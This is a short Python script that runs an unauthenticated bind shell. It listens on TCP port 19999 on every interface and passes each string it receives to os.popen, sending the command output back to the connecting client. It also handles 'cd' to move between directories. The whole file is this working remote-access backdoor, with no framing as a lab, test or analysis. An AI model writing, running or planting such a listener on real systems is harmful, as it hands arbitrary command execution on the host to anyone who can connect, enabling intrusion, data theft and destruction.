from socket import *
import os

if __name__ == "__main__":
    #setting server
    s = socket(AF_INET,SOCK_STREAM)
    s.bind(('',19999))
    s.listen(5)
    print("listening: ")
    while True:
        clientSocket, address = s.accept()        
        while True:
            print('Receiving..')
            inp = clientSocket.recv(4096).decode()
            output = 'NULL'
            if(inp.lower() == 'exit'):
                break
            if(len(inp) >= 2 and 'cd' == inp[:2]):
                if inp == 'cd':
                    print('calling cd here')
                    os.chdir(os.path.expanduser('~'))
                else:
                    print('changing directory')
                    os.chdir(inp[3:])
                output = 'cd'
            elif len(inp) > 0:
                print('calling systems')
                output = os.popen(inp).read()
            print('sending ',output)
            clientSocket.send(output.encode())
        clientSocket.close()